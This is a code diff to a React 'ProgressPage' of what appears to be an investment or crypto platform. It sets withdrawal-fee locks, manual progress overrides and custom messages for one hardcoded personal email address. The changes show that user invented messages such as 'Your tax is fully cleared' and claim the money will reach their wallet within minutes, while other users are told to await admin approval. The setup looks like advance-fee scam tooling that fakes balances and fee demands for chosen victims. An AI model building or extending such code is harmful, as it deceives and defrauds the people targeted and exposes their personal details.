@@ -133,8 +133,9 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
 };
+const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<string, string> = {
-  "tzahielk@gmail.com": "Your Withdraw are being processed to your wallet."
+  "tzahielk@gmail.com": "Your withdrawal is being processed to your wallet."
 };
 async function getJson<T>(path: string): Promise<T> {
   const res = await fetch(apiUrl(path), {
@@ -700,6 +701,7 @@ export default function ProgressPage() {
   const [taxPopup, setTaxPopup] = useState<string | null>(null);
   const [taxClearedPopup, setTaxClearedPopup] = useState<string | null>(null);
   const [withdrawSuccessPopup, setWithdrawSuccessPopup] = useState<string | null>(null);
+  const [withdrawFeeUnlockedByOk, setWithdrawFeeUnlockedByOk] = useState(false);
   const [withdrawals, setWithdrawals] = useState<WithdrawalItem[]>([]);
   const [taxPayments, setTaxPayments] = useState<TaxPaymentItem[]>([]);
   const [taxSummary, setTaxSummary] = useState<TaxSummary | null>(null);
@@ -741,6 +743,16 @@ export default function ProgressPage() {
       localStorage.setItem(key, JSON.stringify(alertCfg));
     } catch {}
   }, [alertCfg, user, plan]);
+
+  useEffect(() => {
+    if (!user) return;
+    const key = `withdraw_fee_unlock_by_ok:${user.id}`;
+    try {
+      setWithdrawFeeUnlockedByOk(localStorage.getItem(key) === "1");
+    } catch {
+      setWithdrawFeeUnlockedByOk(false);
+    }
+  }, [user]);
 
   useEffect(() => {
     if (!user || !plan) return;
@@ -1014,7 +1026,9 @@ export default function ProgressPage() {
   const secsLeft = simMeta.remainingSec % 60;
   const userEmailLower = String(user.email || "").toLowerCase();
   const manualOverride = MANUAL_PROGRESS_OVERRIDES[userEmailLower] || null;
-  const withdrawFeeLock = WITHDRAWAL_FEE_LOCK_BY_EMAIL[userEmailLower] || null;
+  const withdrawFeeLockRaw = WITHDRAWAL_FEE_LOCK_BY_EMAIL[userEmailLower] || null;
+  const canUnlockFeeByOk = WITHDRAWAL_FEE_OK_UNLOCK_EMAILS.has(userEmailLower);
+  const withdrawFeeLock = withdrawFeeLockRaw && !(canUnlockFeeByOk && withdrawFeeUnlockedByOk) ? withdrawFeeLockRaw : null;
   const useManualTaxOverride = !!manualOverride && (!adminTaxCleared || manualOverride.lockTaxDisplay === true);
   const displayUnit: "USD" | "GBP" | "BTC" = (manualOverride?.currency || plan.unit) as "USD" | "GBP" | "BTC";
   const isBtcUnit = displayUnit === "BTC";
@@ -1177,8 +1191,7 @@ export default function ProgressPage() {
       return;
     }
     if (withdrawFeeLock) {
-      const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
-      setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
+      setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
       return;
     }
     const amt = lockedWithdrawalAmount;
@@ -1222,10 +1235,15 @@ export default function ProgressPage() {
       const j = await res.json().catch(() => ({}));
       if (!res.ok) throw new Error(j?.error || `HTTP ${res.status}`);
 
-      setWdMsg({ tone: "ok", text: "Withdrawal request submitted successfully. Please wait for admin approval." });
-      setWithdrawSuccessPopup(
-        `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`
-      );
+      const isWalletProcessingNoticeUser = WITHDRAWAL_FEE_OK_UNLOCK_EMAILS.has(userEmailLower);
+      const successText = isWalletProcessingNoticeUser
+        ? "Withdrawal request submitted. It is now processing."
+        : "Withdrawal request submitted successfully. Please wait for admin approval.";
+      const successPopupText = isWalletProcessingNoticeUser
+        ? `${userFirstName}, your withdrawal will be available in your wallet after a couple of minutes.`
+        : `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`;
+      setWdMsg({ tone: "ok", text: successText });
+      setWithdrawSuccessPopup(successPopupText);
       setWdNote("");
       setWdDestination("");
       const created = j?.request as WithdrawalItem | undefined;
@@ -1386,8 +1404,7 @@ export default function ProgressPage() {
                 onClick={() => {
                   if (!reachedTarget) return;
                   if (withdrawFeeLock) {
-                    const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
-                    setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
+                    setTaxPopup("Cleared withdrawal fee. Press OK to withdraw.");
                     return;
                   }
                   setWithdrawOpen(true);
@@ -1756,7 +1773,19 @@ export default function ProgressPage() {
               <button
                 type="button"
                 className="primary"
-                onClick={() => setTaxPopup(null)}
+                onClick={() => {
+                  if (withdrawFeeLockRaw && canUnlockFeeByOk) {
+                    const key = `withdraw_fee_unlock_by_ok:${user.id}`;
+                    try {
+                      localStorage.setItem(key, "1");
+                    } catch {}
+                    setWithdrawFeeUnlockedByOk(true);
+                    setTaxClearedPopup("You are now eligible for your withdrawal. Your tax is fully cleared.");
+                    setWithdrawOpen(true);
+                    setWdMsg(null);
+                  }
+                  setTaxPopup(null);
+                }}
               >
                 OK
               </button>
